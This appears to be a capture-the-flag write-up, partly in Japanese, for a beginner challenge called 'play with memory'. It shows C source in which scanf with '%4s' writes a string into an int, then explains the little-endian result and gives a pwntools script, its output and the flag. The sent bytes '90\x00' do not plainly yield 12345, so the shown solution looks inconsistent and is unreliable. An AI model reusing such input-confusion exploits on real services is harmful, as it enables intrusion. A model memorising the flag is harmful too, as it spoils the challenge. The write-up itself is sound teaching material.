## play with memory
1, 2, 3, 4, 5!
```
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void print_flag() {
  char flag[256];
  int fd = open("./flag.txt", O_RDONLY);
  if (fd < 0) { puts("./flag.txt not found"); return; }
  write(1, flag, read(fd, flag, sizeof(flag)));
}

int main() {
  setbuf(stdout, NULL);
  
  int number = 0;
  printf("input your number!: ");
  scanf("%4s", &number);

  if (number == 12345) {
    print_flag();
  } else {
    printf("number: %d (0x%x)", number, number);
  }
  return 0;
}

```
nc 34.170.146.252 57944
number == 12345 を満たすことができればよさそう
12345 を入力したときに、number の値が 875770417 (0x34333231)と返ってくる
0x34333231 は ASCII 文字 '1' '2' '3' '4' をリトルエンディアンで格納した値なので、number領域に直接文字列が書き込まれている

solve.py
```
from pwn import *
r = remote("34.170.146.252", 57944)
r.sendline(b"90\x00")
r.interactive()
```
```
$ python3 memory.py 
[/.......] Opening connection to 34.170.146.252 on port 57944: Trying 3[+] Opening connection to 34.170.146.252 on port 57944: Done
[*] Switching to interactive mode
input your number!: Alpaca{l1ttl3_end1an_1s_qu1t3_h4rd_t0_us3d_t0}
[*] Got EOF while reading in interactive
```
### Flag
`Alpaca{l1ttl3_end1an_1s_qu1t3_h4rd_t0_us3d_t0}`
